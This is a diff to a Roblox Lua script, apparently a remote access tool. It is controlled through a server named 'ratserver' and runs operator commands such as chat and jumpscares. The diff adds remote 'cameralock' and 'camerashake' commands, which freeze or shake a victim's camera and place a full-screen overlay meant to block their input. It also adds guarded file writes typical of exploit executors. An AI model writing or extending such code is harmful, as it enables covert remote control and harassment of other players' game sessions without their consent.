@@ -12,6 +12,12 @@ local CoreGui = game:GetService("CoreGui")
 local SERVER_URL = "https://ratserver-6wo3.onrender.com"
 local player = Players.LocalPlayer
 
+-- Новые переменные для камерных функций
+local cameraLockEnabled = false
+local cameraShakeEnabled = false
+local originalCameraType = nil
+local cameraLockGui = nil
+
 local function getDeviceType()
     if UserInputService.TouchEnabled then
         if UserInputService.MouseEnabled then
@@ -644,13 +650,17 @@ local function loadImageFromURL(url, defaultAssetId)
     
     if success and imageData and #imageData > 100 then
         local tempFile = "jumpscare_img_" .. math.random(10000,99999) .. ".png"
-        writefile(tempFile, imageData)
-        
-        if getcustomasset then
-            local asset = getcustomasset(tempFile)
-            if asset then
-                return asset
-            end
+        if safeCheck("writefile") then
+            pcall(function()
+                writefile(tempFile, imageData)
+                
+                if getcustomasset then
+                    local asset = getcustomasset(tempFile)
+                    if asset then
+                        return asset
+                    end
+                end
+            end)
         end
     end
     
@@ -863,6 +873,121 @@ local function executeJumpscareCommand(scareType)
     end
 end
 
+-- НОВАЯ ФУНКЦИЯ: Блокировка камеры
+local function cameraLock(enable)
+    if cameraLockEnabled == enable then return false end
+    
+    cameraLockEnabled = enable
+    local camera = workspace.CurrentCamera
+    
+    if enable then
+        -- Сохраняем текущий тип камеры
+        originalCameraType = camera.CameraType
+        
+        -- Меняем на Scriptable для полного контроля
+        camera.CameraType = Enum.CameraType.Scriptable
+        
+        -- Сохраняем начальную позицию камеры
+        local startCFrame = camera.CFrame
+        
+        -- Запускаем цикл блокировки
+        task.spawn(function()
+            while cameraLockEnabled and camera do
+                camera.CFrame = startCFrame
+                task.wait()
+            end
+        end)
+        
+        -- Создаем UI для блокировки ввода
+        local screenGui = Instance.new("ScreenGui")
+        screenGui.Name = "CameraLockUI"
+        screenGui.Parent = player:WaitForChild("PlayerGui")
+        screenGui.ResetOnSpawn = false
+        
+        local lockFrame = Instance.new("Frame")
+        lockFrame.Size = UDim2.new(1, 0, 1, 0)
+        lockFrame.BackgroundTransparency = 1
+        lockFrame.Active = true
+        lockFrame.Selectable = true
+        lockFrame.Parent = screenGui
+        
+        -- Сохраняем ссылку на GUI для удаления
+        cameraLockGui = screenGui
+        
+        -- Блокируем все вводы
+        lockFrame.InputBegan:Connect(function()
+            return
+        end)
+        
+        return true
+    else
+        -- Восстанавливаем камеру
+        if originalCameraType then
+            camera.CameraType = originalCameraType
+            originalCameraType = nil
+        end
+        
+        -- Удаляем UI блокировки
+        pcall(function()
+            if cameraLockGui and cameraLockGui.Parent then
+                cameraLockGui:Destroy()
+                cameraLockGui = nil
+            end
+        end)
+        
+        return true
+    end
+end
+
+-- НОВАЯ ФУНКЦИЯ: Тряска камеры
+local function cameraShake(duration, intensity)
+    if cameraShakeEnabled then return false end
+    
+    cameraShakeEnabled = true
+    local camera = workspace.CurrentCamera
+    local originalCFrame = camera.CFrame
+    local startTime = os.time()
+    
+    task.spawn(function()
+        while cameraShakeEnabled and camera do
+            local currentTime = os.time()
+            if currentTime - startTime >= duration then
+                break
+            end
+            
+            -- Случайное смещение с плавностью
+            local progress = (currentTime - startTime) / duration
+            local currentIntensity = intensity * (1 - progress * 0.5) -- постепенно уменьшаем
+            
+            local offset = Vector3.new(
+                (math.random() - 0.5) * 2 * currentIntensity,
+                (math.random() - 0.5) * 2 * currentIntensity * 0.5, -- вертикальная тряска меньше
+                (math.random() - 0.5) * 2 * currentIntensity
+            )
+            
+            -- Применяем тряску с плавным переходом
+            camera.CFrame = originalCFrame * CFrame.new(offset)
+            
+            task.wait(0.05)
+        end
+        
+        -- Плавное восстановление камеры
+        if camera then
+            for i = 1, 10 do
+                if camera then
+                    camera.CFrame = camera.CFrame:Lerp(originalCFrame, i * 0.1)
+                    task.wait(0.05)
+                end
+            end
+            camera.CFrame = originalCFrame
+        end
+        
+        cameraShakeEnabled = false
+    end)
+    
+    return true
+end
+
 local function ExecuteCommand(cmd, args)
     local success = pcall(function()
         if cmd == "chat" then
@@ -1057,6 +1182,34 @@ local function ExecuteCommand(cmd, args)
             task.spawn(function()
                 executeJumpscareCommand(scareType)
             end)
+        
+        -- НОВАЯ КОМАНДА: Блокировка камеры
+        elseif cmd == "cameralock" then
+            if args and args[1] then
+                local action = args[1]:lower()
+                if action == "on" or action == "enable" or action == "true" then
+                    cameraLock(true)
+                elseif action == "off" or action == "disable" or action == "false" then
+                    cameraLock(false)
+                else
+                    -- Автоматическое переключение
+                    cameraLock(not cameraLockEnabled)
+                end
+            else
+                -- Переключение без аргументов
+                cameraLock(not cameraLockEnabled)
+            end
+        
+        -- НОВАЯ КОМАНДА: Тряска камеры  
+        elseif cmd == "camerashake" then
+            local duration = tonumber(args[1]) or 5
+            local intensity = tonumber(args[2]) or 2
+            
+            -- Ограничиваем значения для безопасности
+            duration = math.min(duration, 30)  -- максимум 30 секунд
+            intensity = math.min(intensity, 10) -- максимум интенсивность 10
+            
+            cameraShake(duration, intensity)
         
         end
     end)
